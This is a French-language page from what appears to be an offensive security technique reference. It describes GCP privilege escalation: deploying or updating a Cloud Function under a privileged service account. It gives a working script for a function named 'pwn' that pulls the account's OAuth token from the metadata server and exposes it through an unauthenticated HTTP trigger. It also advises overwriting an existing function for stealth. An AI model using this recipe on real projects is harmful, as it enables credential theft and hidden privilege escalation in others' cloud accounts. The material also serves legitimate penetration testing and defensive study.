---
title: "Cloud Function : déployer du code en tant que compte de service de la fonction"
description: "Déployer ou mettre à jour une Cloud Function avec cloudfunctions.functions.create ou update plus actAs, exécutant le code de l'attaquant en tant que compte de service privilégié de la fonction."
keywords:
  - cloudfunctions
  - actAs
  - compte de service
  - déploiement de fonction
  - exécution de code
  - Cloud Functions
---

# Cloud Function

Avec `cloudfunctions.functions.create` (ou `update`) et `actAs` sur un compte de service, vous déployez une fonction qui exécute votre code en tant que ce compte. Le corps de la fonction lit son propre jeton depuis le serveur de métadonnées et le renvoie, ou agit directement avec les permissions du compte.

## Déployer une fonction qui divulgue son jeton

```bash
cat > main.py <<'EOF'
import requests, os
def pwn(request):
    t = requests.get(
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      headers={"Metadata-Flavor": "Google"}).text
    return t
EOF
echo "requests" > requirements.txt
gcloud functions deploy pwn --runtime=python311 --trigger-http --allow-unauthenticated \
  --entry-point=pwn --service-account=<privileged-sa>@<project>.iam.gserviceaccount.com --source=.
curl "$(gcloud functions describe pwn --format='value(httpsTrigger.url)')"
```

## Notes d'exploitation

- `--service-account` est l'endroit où `actAs` est exercé ; sans le spécifier, la fonction s'exécute en tant que compte par défaut, qui est de toute façon souvent Editor.
- Les fonctions Gen2 s'exécutent sur Cloud Run en coulisses ; le chemin du jeton est identique.
- Mettre à jour le code d'une fonction existante (`functions deploy` sur le même nom) est plus discret que d'en créer une nouvelle et hérite de son compte déjà privilégié.

## Outils

- **gcloud** (`functions deploy`, `functions describe`) : déployer et obtenir l'URL de déclenchement.
- **GCP-IAM-Privilege-Escalation** (Rhino) : automatise la variante déployer-et-voler.

## Références

- [Rhino Security Labs : escalade de privilèges GCP (partie 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [Escalade de privilèges GCP IAM (dépôt Rhino)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [Google : comptes de service Cloud Functions](https://cloud.google.com/functions/docs/securing/function-identity)
